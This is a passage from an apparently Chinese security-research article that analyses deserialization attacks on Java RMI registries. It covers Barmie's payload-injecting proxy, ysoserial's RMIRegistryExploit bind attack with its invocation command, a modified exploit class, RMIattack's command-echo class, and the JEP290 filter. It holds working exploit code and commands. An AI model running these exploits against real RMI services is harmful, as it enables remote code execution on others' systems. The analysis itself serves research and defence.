+看看具体实现<code>nb.barmie.net.proxy.thread.BindPayloadInjectingProxyThread#handleData</code></p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">ByteArrayOutputStream</span> <span class="nf">handleData</span><span class="o">(</span><span class="n">ByteArrayOutputStream</span> <span class="n">data</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">ByteArrayOutputStream</span> <span class="n">out</span><span class="o">;</span>
+        <span class="kt">int</span> <span class="n">blockLen</span><span class="o">;</span>
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">dataBytes</span><span class="o">;</span>
+        <span class="c1">//获取输入的长度</span>
+        <span class="n">dataBytes</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">();</span>
+        <span class="c1">//判断这个输入包是不是一个RMI调用包，如果是的话进行修改</span>
+        <span class="k">if</span><span class="o">(</span><span class="n">dataBytes</span><span class="o">.</span><span class="na">length</span> <span class="o">&gt;</span> <span class="mi">7</span> <span class="o">&amp;&amp;</span> <span class="n">dataBytes</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span> <span class="o">==</span> <span class="o">(</span><span class="kt">byte</span><span class="o">)</span><span class="mh">0x50</span><span class="o">)</span> <span class="o">{</span>
+            <span class="c1">//调用包以 TC_BLOCKDATA 标签开头,获取它的标签长度</span>
+            <span class="n">blockLen</span> <span class="o">=</span> <span class="o">(</span><span class="kt">int</span><span class="o">)(</span><span class="n">dataBytes</span><span class="o">[</span><span class="mi">6</span><span class="o">]</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="o">);</span>
+
+            <span class="c1">//自己构建一个新的字节流，以原来包的长度和TC_BLOCKDATA标签开头</span>
+            <span class="n">out</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+            <span class="n">out</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">dataBytes</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">blockLen</span> <span class="o">+</span> <span class="mi">7</span><span class="o">);</span>
+
+            <span class="c1">//在后面写入我们给定的payload</span>
+            <span class="n">out</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">_payload</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="k">this</span><span class="o">.</span><span class="na">_payload</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
+
+            <span class="c1">//最后给一个NULL标签（作为bind方法的第二个参数）</span>
+            <span class="n">out</span><span class="o">.</span><span class="na">write</span><span class="o">((</span><span class="kt">byte</span><span class="o">)</span><span class="mh">0x70</span><span class="o">);</span>
+
+            <span class="c1">//把新的数据包发送给服务端</span>
+            <span class="k">return</span> <span class="n">out</span><span class="o">;</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+            <span class="c1">//不是RMI调用的数据包就直接发送</span>
+            <span class="k">return</span> <span class="n">data</span><span class="o">;</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+</pre></div>
+<p>可以看到这边完全是自己重构了客户端发往服务端的数据包，并且给入了两个参数，<strong>payload</strong>替换<strong>String</strong>，<strong>null</strong>替换<strong>Remote</strong>。</p>
+<p>我们再攻击一下我们的RMI服务端靶机，用wireshark抓包确认下，顺便把后面Ysoserial-RMIRegistryExploit的包先提上来对比一下：</p>
+<p><a id="img17" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622135914-8017b812-b44d-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622135914-8017b812-b44d-1.png"></a></p>
+<p><a id="img18" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622135925-86ddc132-b44d-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622135925-86ddc132-b44d-1.png"></a></p>
+<p>可以发现Barmie的bind攻击是通过第一个String参数替换payload（Hashset就是CC的攻击链）攻击成功的，而Ysoserial的RMIRegisterExpolit模块的bind攻击是通过构造了一个符合Remote条件的第二个Remote参数（把CC的攻击链包装成了Remote）攻击成功的。</p>
+<p>那么之前的疑问 <strong>是不是我们只能攻击必须要是Remote类型的Object接口呢？</strong>也就破案了：不是，是String和Remote类型均可。</p>
+<p>那么也就是说<strong>lookup</strong>、<strong>unbind</strong>、<strong>rebind</strong>、<strong>bind</strong>四个接口都可以利用同样的原理攻击。</p>
+<h3 id="toc-10">Ysoserial-RMIRegistryExploit - Bind</h3>
+<p>那么Ysoserial不写代理器还去自己把CC攻击链包装成了Remote类型，也挺有意思的，我们看看它是怎么做的。</p>
+<p>命令行用这个命令调用exploit模块：<code>java -cp F:\xxx\java\ysoserial.jar ysoserial.exploit.RMIRegistryExploit 127.0.0.1 1099 CommonsCollections1 "calc"</code></p>
+<p>看下核心代码<code>ysoserial.exploit.RMIRegistryExploit#exploit</code>：</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">exploit</span><span class="o">(</span><span class="kd">final</span> <span class="n">Registry</span> <span class="n">registry</span><span class="o">,</span>
+            <span class="kd">final</span> <span class="n">Class</span><span class="o">&lt;?</span> <span class="kd">extends</span> <span class="n">ObjectPayload</span><span class="o">&gt;</span> <span class="n">payloadClass</span><span class="o">,</span>
+            <span class="kd">final</span> <span class="n">String</span> <span class="n">command</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="k">new</span> <span class="n">ExecCheckingSecurityManager</span><span class="o">().</span><span class="na">callWrapped</span><span class="o">(</span><span class="k">new</span> <span class="n">Callable</span><span class="o">&lt;</span><span class="n">Void</span><span class="o">&gt;(){</span><span class="kd">public</span> <span class="n">Void</span> <span class="nf">call</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+            <span class="c1">//获取payload</span>
+            <span class="n">ObjectPayload</span> <span class="n">payloadObj</span> <span class="o">=</span> <span class="n">payloadClass</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
+            <span class="n">Object</span> <span class="n">payload</span> <span class="o">=</span> <span class="n">payloadObj</span><span class="o">.</span><span class="na">getObject</span><span class="o">(</span><span class="n">command</span><span class="o">);</span>
+            <span class="n">String</span> <span class="n">name</span> <span class="o">=</span> <span class="s">"pwned"</span> <span class="o">+</span> <span class="n">System</span><span class="o">.</span><span class="na">nanoTime</span><span class="o">();</span>
+            <span class="c1">//将payload封装成Map</span>
+            <span class="c1">//然后通过sun.reflect.annotation.AnnotationInvocationHandler建立起动态代理</span>
+            <span class="c1">//变为Remote类型</span>
+            <span class="n">Remote</span> <span class="n">remote</span> <span class="o">=</span> <span class="n">Gadgets</span><span class="o">.</span><span class="na">createMemoitizedProxy</span><span class="o">(</span><span class="n">Gadgets</span><span class="o">.</span><span class="na">createMap</span><span class="o">(</span><span class="n">name</span><span class="o">,</span> <span class="n">payload</span><span class="o">),</span> <span class="n">Remote</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="c1">//封装的remote类型，通过RMI客户端的正常接口发出去</span>
+                <span class="n">registry</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="n">name</span><span class="o">,</span> <span class="n">remote</span><span class="o">);</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="o">}</span>
+            <span class="n">Utils</span><span class="o">.</span><span class="na">releasePayload</span><span class="o">(</span><span class="n">payloadObj</span><span class="o">,</span> <span class="n">payload</span><span class="o">);</span>
+            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="o">}});</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p>使用到了<strong>动态代理</strong>，简单总结一下：</p>
+<ul>
+<li>被代理的接口：Remote.class</li>
+<li>代理的实现类（也可以理解为拦截器）：sun.reflect.annotation.AnnotationInvocationHandler</li>
+<li>动态代理之后的对象：调用实现Remote接口的绑定代理的对象的任意方法都会自动被拦截，前往<code>sun.reflect.annotation.AnnotationInvocationHandler</code>的invoke方法执行。</li>
+</ul>
+<p>简单看下是怎么ysoserial是怎么样完成动态代理的，即<code>ysoserial.payloads.util.Gadgets#createMemoitizedProxy</code>的实现：</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="n">T</span> <span class="nf">createMemoitizedProxy</span> <span class="o">(</span> <span class="kd">final</span> <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span><span class="o">,</span> <span class="kd">final</span> <span class="n">Class</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="n">iface</span><span class="o">,</span> <span class="kd">final</span> <span class="n">Class</span><span class="o">&lt;?&gt;...</span> <span class="n">ifaces</span> <span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+    <span class="c1">//Map是我们传入的，需要填充进入AnnotationInvocationHandler构造方法中的对象。</span>
+    <span class="c1">//iface是被动态代理的接口</span>
+    <span class="k">return</span> <span class="n">createProxy</span><span class="o">(</span><span class="n">createMemoizedInvocationHandler</span><span class="o">(</span><span class="n">map</span><span class="o">),</span> <span class="n">iface</span><span class="o">,</span> <span class="n">ifaces</span><span class="o">);</span>
+<span class="o">}</span>
+
+<span class="c1">//这里创建了一个`sun.reflect.annotation.AnnotationInvocationHandler`拦截器的对象</span>
+<span class="c1">//传入了我们含有payload的map，进入构造方法，会在构造方法内进行赋值给对象的变量</span>
+<span class="kd">public</span> <span class="kd">static</span> <span class="n">InvocationHandler</span> <span class="nf">createMemoizedInvocationHandler</span> <span class="o">(</span> <span class="kd">final</span> <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">map</span> <span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+    <span class="k">return</span> <span class="o">(</span><span class="n">InvocationHandler</span><span class="o">)</span> <span class="n">Reflections</span><span class="o">.</span><span class="na">getFirstCtor</span><span class="o">(</span><span class="n">ANN_INV_HANDLER_CLASS</span><span class="o">).</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Override</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">map</span><span class="o">);</span>
+<span class="o">}</span>
+
+<span class="c1">//正式开始绑定代理动态代理</span>
+<span class="c1">//ih 拦截器</span>
+<span class="c1">//iface 需要被代理的类</span>
+<span class="c1">//ifaces 这里没有</span>
+<span class="kd">public</span> <span class="kd">static</span> <span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="n">T</span> <span class="nf">createProxy</span> <span class="o">(</span> <span class="kd">final</span> <span class="n">InvocationHandler</span> <span class="n">ih</span><span class="o">,</span> <span class="kd">final</span> <span class="n">Class</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span> <span class="n">iface</span><span class="o">,</span> <span class="kd">final</span> <span class="n">Class</span><span class="o">&lt;?&gt;...</span> <span class="n">ifaces</span> <span class="o">)</span> <span class="o">{</span>
+    <span class="kd">final</span> <span class="n">Class</span><span class="o">&lt;?&gt;[]</span> <span class="n">allIfaces</span> <span class="o">=</span> <span class="o">(</span><span class="n">Class</span><span class="o">&lt;?&gt;[])</span> <span class="n">Array</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="n">Class</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="n">ifaces</span><span class="o">.</span><span class="na">length</span> <span class="o">+</span> <span class="mi">1</span><span class="o">);</span>
+    <span class="n">allIfaces</span><span class="o">[</span> <span class="mi">0</span> <span class="o">]</span> <span class="o">=</span> <span class="n">iface</span><span class="o">;</span>
+    <span class="k">if</span> <span class="o">(</span> <span class="n">ifaces</span><span class="o">.</span><span class="na">length</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">)</span> <span class="o">{</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">arraycopy</span><span class="o">(</span><span class="n">ifaces</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">allIfaces</span><span class="o">,</span> <span class="mi">1</span><span class="o">,</span> <span class="n">ifaces</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
+    <span class="o">}</span>
+    <span class="c1">//上面整合了一下需要代理的接口到allIfaces里面</span>
+    <span class="c1">//然后Proxy.newProxyInstance，完成allIfaces到ih的绑定</span>
+    <span class="c1">//（Gadgets.class.getClassLoader()就是获取了一个加载器，不用太管）</span>
+    <span class="c1">//iface.cast是将获取的绑定结果对象转变为iface（即Remote）的对象类型</span>
+    <span class="k">return</span> <span class="n">iface</span><span class="o">.</span><span class="na">cast</span><span class="o">(</span><span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="n">Gadgets</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span> <span class="n">allIfaces</span><span class="o">,</span> <span class="n">ih</span><span class="o">));</span>
+<span class="o">}</span>
+</pre></div>
+<p>这边就完成了一个通过<strong>动态代理</strong>封装成了一个Remote.class的接口对象，这样就可以在客户端正常调用<code>registry.bind(name, remote);</code>了，因为bind的接口这么定义了需要Remote对象。</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">bind</span><span class="o">(</span><span class="n">String</span> <span class="n">name</span><span class="o">,</span> <span class="n">Remote</span> <span class="n">obj</span><span class="o">)</span>
+        <span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">,</span> <span class="n">AlreadyBoundException</span><span class="o">,</span> <span class="n">AccessException</span><span class="o">;</span>
+</pre></div>
+<p>那么我们传输过去了我们的remote动态代理对象，在服务端解析过程中与动态代理有关系么？</p>
+<p><strong>答案是：P关系都没有！</strong></p>
+<p>上面可以看到我们的使用的是yso-cc1的payload去在jdk1.7u80中触发payload：而cc1的触发同样使用到了动态代理机制，该payload在服务端的触发与动态代理也息息相关：</p>
+<ul>
+<li>cc1的payload是一个AnnotationInvocationHandler对象，跟上面类似，在其构造的时候，我们把一个 <strong>动态代理到AnnotationInvocationHandler.invoke方法的map</strong> 塞入了其memberValues属性中</li>
+<li>在服务端触发var.readobject()时，会进入AnnotationInvocationHandler类的readobject()</li>
+<li>在readobject()中会执行<code>this.memberValues.entrySet()</code>。entrySet，这是一个map的方法。根据动态代理性质，我们绑定了map的方法到AnnotationInvocationHandler.invoke方法，所以这边就会进入invoke方法。</li>
+<li>同时我们还在这个处心积虑想进来的invoke方法的AnnotationInvocationHandler对象中又弄了一个lazyMap在memberValues属性中！只要触发了这个lazyMap的get方法就等于成功。（之后复杂的就略了）</li>
+<li>而AnnotationInvocationHandler.invoke方法中刚好有<code>this.memberValues.get(var4);</code>，而这个this.memberValues就是lazyMap。</li>
+</ul>
+<p>这边简单讲了下动态代理在一般序列化链中的作用，就是<strong>连接一个类的任意方法到一个拦截器的invoke方法（到invoke方法！）</strong></p>
+<p>而在这边Ysoserial通过动态代理产生的<strong>remote对象丝毫没有用到动态代理核心的特点（到invoke方法中）</strong>。</p>
+<p>它实际做的只是把payload放在一个remote接口的类的属性里面。然后在服务端反序列化的时候，利用反序列化一个对象的过程中会递归类的属性进行反序列化的特点，来反序列化我们的payload，从而触发漏洞。</p>
+<p>使用动态代理只是因为：动态代理也同样可以做到把payload放在AnnotationInvocationHandler拦截器的属性里面，然后动态代理可以把拦截器包装成任意类接口，如下：</p>
+<p><a id="img19" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140003-9d9d4e06-b44d-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140003-9d9d4e06-b44d-1.png"></a></p>
+<p>同样我们也可以不用动态代理，自己实现一个remote接口的类，然后放入payload，效果是一样的。</p>
+<p>修改一点点：<code>ysoserial.exploit.RMIRegistryExploit#exploit</code></p>
+<div class="highlight"><pre><span></span><span class="c1">//加个Remote接口的类，要支持序列化</span>
+<span class="kd">private</span> <span class="kd">static</span> <span class="kd">class</span> <span class="nc">BindExploit</span> <span class="kd">implements</span> <span class="n">Remote</span><span class="o">,</span> <span class="n">Serializable</span> <span class="o">{</span>
+    <span class="c1">//弄个地方放payload</span>
+    <span class="kd">private</span> <span class="kd">final</span> <span class="n">Object</span> <span class="n">memberValues</span><span class="o">;</span>
+
+    <span class="kd">private</span> <span class="nf">BindExploit</span><span class="o">(</span><span class="n">Object</span> <span class="n">payload</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">memberValues</span> <span class="o">=</span> <span class="n">payload</span><span class="o">;</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">exploit</span><span class="o">(</span><span class="kd">final</span> <span class="n">Registry</span> <span class="n">registry</span><span class="o">,</span>
+            <span class="kd">final</span> <span class="n">Class</span><span class="o">&lt;?</span> <span class="kd">extends</span> <span class="n">ObjectPayload</span><span class="o">&gt;</span> <span class="n">payloadClass</span><span class="o">,</span>
+            <span class="kd">final</span> <span class="n">String</span> <span class="n">command</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="k">new</span> <span class="n">ExecCheckingSecurityManager</span><span class="o">().</span><span class="na">callWrapped</span><span class="o">(</span><span class="k">new</span> <span class="n">Callable</span><span class="o">&lt;</span><span class="n">Void</span><span class="o">&gt;(){</span><span class="kd">public</span> <span class="n">Void</span> <span class="nf">call</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+            <span class="n">ObjectPayload</span> <span class="n">payloadObj</span> <span class="o">=</span> <span class="n">payloadClass</span><span class="o">.</span><span class="na">newInstance</span><span class="o">();</span>
+            <span class="n">Object</span> <span class="n">payload</span> <span class="o">=</span> <span class="n">payloadObj</span><span class="o">.</span><span class="na">getObject</span><span class="o">(</span><span class="n">command</span><span class="o">);</span>
+            <span class="n">String</span> <span class="n">name</span> <span class="o">=</span> <span class="s">"pwned"</span> <span class="o">+</span> <span class="n">System</span><span class="o">.</span><span class="na">nanoTime</span><span class="o">();</span>
+            <span class="c1">//yso动态代理包装</span>
+            <span class="c1">//Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, payload), Remote.class);</span>
+            <span class="c1">//自己包装</span>
+            <span class="n">Remote</span> <span class="n">remote_lala</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BindExploit</span><span class="o">(</span><span class="n">payload</span><span class="o">);</span>
+
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="c1">//registry.bind(name, remote);</span>
+                <span class="c1">//自己包装</span>
+                 <span class="n">registry</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="n">name</span><span class="o">,</span> <span class="n">remote_lala</span><span class="o">);</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+                <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+            <span class="o">}</span>
+            <span class="n">Utils</span><span class="o">.</span><span class="na">releasePayload</span><span class="o">(</span><span class="n">payloadObj</span><span class="o">,</span> <span class="n">payload</span><span class="o">);</span>
+            <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="o">}});</span>
+    <span class="o">}</span>
+</pre></div>
+<p><a id="img20" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140016-a5434bba-b44d-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140016-a5434bba-b44d-1.png"></a></p>
+<p><a id="img21" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140027-ab97ab78-b44d-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140027-ab97ab78-b44d-1.png"></a></p>
+<p>这里有一个不是很清楚的问题，自实现remote接口往里放入payload，在RMI客户端有这个类，那序列化传输到RMI服务端，<strong>服务端环境里是没有这个类的，是否会报错，无法利用</strong>？？</p>
+<p>本地测试实际上是两个java项目，攻击方yso项目，服务方RMIserialize项目，因此环境是不通的。</p>
+<p>测试报错可以证明，是找不到这个类的，但是却不影响利用。</p>
+<p><a id="img22" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140120-cb2cf4c0-b44d-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140120-cb2cf4c0-b44d-1.png"></a></p>
+<p>可以从报错信息中看到是ClassNotFound的，但是仍然弹框成功。大概的理由猜测应该是反序列化恢复一个类的时候会先去处理好他的序列化变量，再去进行组装恢复成类。我们触发payload的过程是恢复他的序列化变量的时候，而之后找得到找不到这个类就不重要了。</p>
+<blockquote><p>这个ysoserial用动态代理去实现remote接口封装payload的操作真的让我迷惑了好久，我一直以为服务端payload触发和动态代理的特性有关(由于CC链是这样的，想当然这样了)。网上的文章大多一笔带过，这边再次感谢0kami大佬QAQ，沟通是真的解惑。</p>
+</blockquote>
+<h3 id="toc-11">RMIattack - Bind + 回显</h3>
+<p>在反序列化利用的时候，常常遇到你一个payload打过去，但是对方没反应，你也不知道对方执行了命令没有。命令执行结果回显一直是一个很头疼的问题。RMIattack工具解决了命令回显的问题。</p>
+<p>这个工具在Ysoserial-RMIRegistryExploit模块的基础上（同样是用动态调用封装payload至remote接口类，并且使用的是CC1的payload）通过写入了一个class文件，再调用class文件来执行系统命令的形式，实现命令回显。我们简单看下实现过程。</p>
+<p>其攻击步骤主要分为两部分：</p>
+<ol>
+<li>先判断系统类型：windows，linux，然后写入一个文件再临时目录。（这里修改了CC链的底层调用函数，yso默认是调用Runtime.getRuntime().exec()，这边改成了write()方法）<ul>
+<li>windows的话生成文件<code>c:/windows/temp/ErrorBaseExec.class</code></li>
+<li>linux的话生成<code>/tmp/ErrorBaseExec.class</code></li>
+</ul>
+</li>
+<li>根据操作系统类型，从固定路径loadclass加载class，然后调用其do_exec方法，传入要执行的命令。执行的命令结果会写在抛出异常中，服务器通过异常抛出传输执行结果到客户端，然后客户端解析报错信息获取命令执行结果。</li>
+</ol>
+<p>由于在工具代码中，写入的文件直接被写成字节串了，这边可以自己打一下自己，来拿到被写入的文件<code>ErrorBaseExec.class</code></p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">ErrorBaseExec</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="nf">ErrorBaseExec</span><span class="o">()</span> <span class="o">{</span>
+    <span class="o">}</span>
+    <span class="c1">//解析</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">String</span> <span class="nf">readBytes</span><span class="o">(</span><span class="n">InputStream</span> <span class="n">var0</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+        <span class="n">BufferedReader</span> <span class="n">var1</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="n">InputStreamReader</span><span class="o">(</span><span class="n">var0</span><span class="o">));</span>
+        <span class="n">StringBuffer</span> <span class="n">var2</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StringBuffer</span><span class="o">();</span>
+
+        <span class="n">String</span> <span class="n">var3</span><span class="o">;</span>
+        <span class="k">while</span><span class="o">((</span><span class="n">var3</span> <span class="o">=</span> <span class="n">var1</span><span class="o">.</span><span class="na">readLine</span><span class="o">())</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">var2</span><span class="o">.</span><span class="na">append</span><span class="o">(</span><span class="n">var3</span><span class="o">).</span><span class="na">append</span><span class="o">(</span><span class="s">"\n"</span><span class="o">);</span>
+        <span class="o">}</span>
+
+        <span class="n">String</span> <span class="n">var4</span> <span class="o">=</span> <span class="n">var2</span><span class="o">.</span><span class="na">toString</span><span class="o">();</span>
+        <span class="k">return</span> <span class="n">var4</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">do_exec</span><span class="o">(</span><span class="n">String</span> <span class="n">var0</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="c1">//执行命令</span>
+            <span class="n">Process</span> <span class="n">var1</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">var0</span><span class="o">);</span>
+            <span class="c1">//解析执行结果</span>
+            <span class="n">String</span> <span class="n">var2</span> <span class="o">=</span> <span class="n">readBytes</span><span class="o">(</span><span class="n">var1</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">());</span>
+            <span class="c1">//抛出异常到客户端</span>
+            <span class="k">throw</span> <span class="k">new</span> <span class="n">Exception</span><span class="o">(</span><span class="s">"8888:"</span> <span class="o">+</span> <span class="n">var2</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var3</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">if</span> <span class="o">(</span><span class="n">var3</span><span class="o">.</span><span class="na">toString</span><span class="o">().</span><span class="na">indexOf</span><span class="o">(</span><span class="s">"8888"</span><span class="o">)</span> <span class="o">&gt;</span> <span class="o">-</span><span class="mi">1</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">throw</span> <span class="n">var3</span><span class="o">;</span>
+            <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+                <span class="k">throw</span> <span class="k">new</span> <span class="n">Exception</span><span class="o">(</span><span class="s">"8888:"</span> <span class="o">+</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">var3</span><span class="o">.</span><span class="na">toString</span><span class="o">())</span> <span class="o">+</span> <span class="s">"\r\n"</span><span class="o">);</span>
+            <span class="o">}</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">var0</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">do_exec</span><span class="o">(</span><span class="s">"cmd /c dir"</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p>写入文件，在调用文件，通过报错信息传递命令执行结果，也算是一种思路。</p>
+<h3 id="toc-12">JEP290修复</h3>
+<p>在JEP290规范之后，即JAVA版本6u141, 7u131, 8u121之后，以上攻击就不奏效了。</p>
+<p>在8u112，使用cc链5打一波，可以正常攻击</p>
+<p><a id="img23" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140145-da846d9a-b44d-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140145-da846d9a-b44d-1.png"></a></p>
+<p>在8u161，使用cc链5攻击，就不可以了:<code>REJECTED</code></p>
+<p><a id="img24" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140155-e032d9ac-b44d-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140155-e032d9ac-b44d-1.png"></a></p>
+<p>在<code>sun.rmi.registry.RegistryImpl#registryFilter</code>处下断点，然后开始调试，往回看，可以发现过滤器是在<code>obj.readObject()</code>语句中的JDK底层进入的，这是JEP在底层实现过滤机制导致的。反序列化动作和过滤器机制都在readObject语句中，这样就不存在逻辑上的跳过、绕过过滤器。</p>
+<p><a id="img25" href="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140211-e9bceb34-b44d-1.png"><img src="./针对RMI服务的九重攻击 - 上 - 先知社区_files/20200622140211-e9bceb34-b44d-1.png"></a></p>
+<p>看<code>sun.rmi.registry.RegistryImpl#registryFilter</code>：</p>
+<div class="highlight"><pre><span></span><span class="kd">private</span> <span class="kd">static</span> <span class="n">Status</span> <span class="nf">registryFilter</span><span class="o">(</span><span class="n">FilterInfo</span> <span class="n">var0</span><span class="o">)</span> <span class="o">{</span>
+    <span class="c1">//这里registryFilter为空跳过该判断</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">registryFilter</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">Status</span> <span class="n">var1</span> <span class="o">=</span> <span class="n">registryFilter</span><span class="o">.</span><span class="na">checkInput</span><span class="o">(</span><span class="n">var0</span><span class="o">);</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">var1</span> <span class="o">!=</span> <span class="n">Status</span><span class="o">.</span><span class="na">UNDECIDED</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="n">var1</span><span class="o">;</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+    <span class="c1">//不允许输入流的递归层数超过20层，超过就报错</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">var0</span><span class="o">.</span><span class="na">depth</span><span class="o">()</span> <span class="o">&gt;</span> <span class="mi">20L</span><span class="o">)</span> <span class="o">{</span>
+        <span class="k">return</span> <span class="n">Status</span><span class="o">.</span><span class="na">REJECTED</span><span class="o">;</span>
+    <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+        <span class="c1">//获取输入流序列化class类型到var2</span>
